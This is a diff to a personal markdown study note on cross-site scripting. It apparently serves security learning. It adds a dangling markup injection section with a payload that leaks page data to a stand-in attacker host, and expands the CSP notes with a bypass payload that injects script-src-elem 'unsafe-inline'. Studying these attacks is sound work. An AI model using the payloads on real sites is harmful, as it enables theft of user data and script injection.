@@ -253,8 +253,19 @@ Similar to Angular [[String Interpolation]], where there is JavaScript executed 
 ${alert(1)}
 ```
 
----
+###### Dangling Markup Injection
 
+Injecting an XSS payload, but not enclosing it properly.
+- When the browser parses the new page, it will keep including data from the HTML of the page until an appropriate character that closes off the injection is faced.
+- This allows attackers to capture data from the page, which might include sensitive information.
+
+```
+"><img src='//attacker-website.com?
+```
+
+> The Chrome browser has decided to tackle dangling markup attacks by preventing tags like `img` from defining URLs containing raw characters such as angle brackets and newlines. This will prevent attacks since the data that would otherwise be captured will generally contain those raw characters, so the attack is blocked.
+
+---
 ### Client Side Template Injection
 
 > These vulnerabilities arise when client side frameworks dynamically embed user input into the webpages.
@@ -262,7 +273,7 @@ ${alert(1)}
 > These can be exploited via XSS.
 
 > Using `.charAt=[].join` causes the function to return all characters sent to it.
-> If there are no strings allowed, by preventing qoutes and double qoutes, we can use `String.fromCharCode()`.
+> If there are no strings allowed, by preventing quotes and double quotes, we can use `String.fromCharCode()`.
 > We don't have access to `String`, so we need to use `fromCharCode()` from an actual string variable, or creating a string.
 > Use `$eval()` to create strings, or the `[1]|orderBy:'String'` function.
 > This String in the end can be created using `fromCharCode()`.
@@ -315,28 +326,59 @@ Can utilize password managers that auto-fill in password fields by adding a pass
 ---
 ### Content Security Policy (CSP)
 
-> Browser mechanism to mitigate XSS via the [[HTTP]] response header `Content-Security-Policy`.
-> The values of that header are directives separated by semicolons.
-> NOT IN FIREFOX.
+This is a browser security mechanism that is used to protect against XSS.
+- It restricts the resources that a page can load, such as images and scripts.
+- It restricts if pages can be loaded using frames like `iframe`.
 
-* `script-src 'self'` : allows only scripts loaded from the same origin page. [[Same Origin Policy (SOP)]].
-* `script-src https://scripts.normal-website.com` : Allows scripts from a specific domain.
+For CSP to be enabled, the responses need to contain the [[HTTP]] header `Content-Security-Policy`. 
+- The value of this header contains policies, and these are the ones used.
+- The policies are a list of directives that are separated by semicolons.
 
-> If these headers are input controlled, they can be attacked.
-> Found in a `report-uri` directive, the last one in the list.
-> A semicolon can be added, and our own policies can be added.
+> Not in Firefox.
 
-> Chrome introduced the `script-src-elem` directive that can be used to control `script` elements.
-> This can be used to overwrite existing `script-src` elements.
+Some directives that can be used:
+- To allow scripts or images to be loaded only from a page with the same origin ([[Same Origin Policy (SOP)]]).
+```
+script-src 'self'
+img-src 'self'
+```
+
+- To allow scripts or images to be loaded from a page with a given domain.
+```
+script-src https://scripts.normal-website.com
+img-src https://images.normal-website.com
+```
+
+Loading scripts from external domains is dangerous, as the external domains themselves could be vulnerable.
+- Therefore, the CSP whitelist should contain only trusted domains.
+- CSP also uses *nonces* and *hashes* to to specify trusted sources.
+
+Nonces are random values that are generated, and should be hard to guess.
+- Both pages, that is, the page loading the resource, and the page supplying the resource should generate the same nonce.
+- This nonce that the CSP directive specifies should be the same one that is then put in a tag in the loaded resource.
+
+Hashes can be made of the content of the trusted resource, and it is specified in the CSP directive.
+- If the hash of the loaded resource doesn't match, then the resource is not trusted.
+- The value of the hash needs to be updated in case the actual trusted resource changes.
+
+##### Exploiting CSP
+
+If attacker input is reflected into the CSP directives, then an attacker can overwrite existing directives or add new ones.
+- This usually happens in the `report-uri` directive.
+- Injecting a semicolon and then adding new directives.
+
+Overwriting the `script-src` directive is not allowed, but the `script-src-elem` can be used to control `script` elements.
+- This allows overwriting existing `script-src` directives.
+
 > Open the console while playing with this to see the results.
 
+Assume the `token` parameter is reflected into the `report-uri` directive.
 ``` HTML
 <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
 ```
-> Added the `unsafe-inline` directive value that takes any script.
+- Added the `unsafe-inline` directive value that takes any script.
 
 ---
-
 ### Preventing XSS Attacks
 
 1. Filter input on arrival
